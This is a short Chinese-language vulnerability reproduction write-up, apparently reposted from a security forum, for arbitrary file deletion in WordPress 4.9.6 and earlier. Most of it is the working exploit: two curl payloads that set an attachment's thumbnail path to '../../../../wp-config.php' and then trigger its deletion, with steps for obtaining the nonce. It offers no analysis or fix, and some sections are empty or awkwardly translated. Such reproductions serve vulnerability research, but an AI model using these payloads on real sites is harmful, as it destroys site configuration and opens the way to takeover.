# Wordpress <= 4.9.6 任意文件删除漏洞

> 原文：[https://www.zhihuifly.com/t/topic/3261](https://www.zhihuifly.com/t/topic/3261)

# Wordpress <= 4.9.6 任意文件删除漏洞

## 一、漏洞简介

利用条件L：需要进入后台

## 二、漏洞影响

## 三、复现过程

### 添加新媒体

访问http://0-sec.org/wp-admin/upload.php，然后上传图片。

![image](img/310d024b0359336a0672d29535ea3914.png)

### 将$ meta ['thumb']设置为我们要删除的文件

#### 单击我们在中上传的图像Step 2，并记住图像的ID。

![image](img/e1d27305d7675aa560ab9a899eaccb10.png)

#### 访问http://0-sec.org/wp-admin/post.php?post=4&action=edit._wpnonce在页面源中查找

![image](img/7cf13de74d450438c06a74e11b87cb25.png)

#### 发送有效载荷：

```
curl -v 'http://0-sec.org/wp-admin/post.php?post=4' -H 'Cookie: ***' -d 'action=editattachment&_wpnonce=***&thumb=../../../../wp-config.php' 
```

![image](img/f8833bcb7b0bcc3a333510c9bfc252da.png)

### 发动攻击

#### 在页面源码中查找 _wpnonce

![image](img/b15ae46cdd5996961cb8b9f185e86107.png)

#### 发送有效载荷

```
curl -v 'http://9c9b.vsplate.me/wp-admin/post.php?post=4' -H 'Cookie: ***' -d 'action=delete&_wpnonce=***' 
```

![image](img/1f7a8beb95ed396dbaa960f4c13abd6a.png)

#### 刷新页面

![image](img/5f5aa846c7590defa4cccac0c4e41089.png)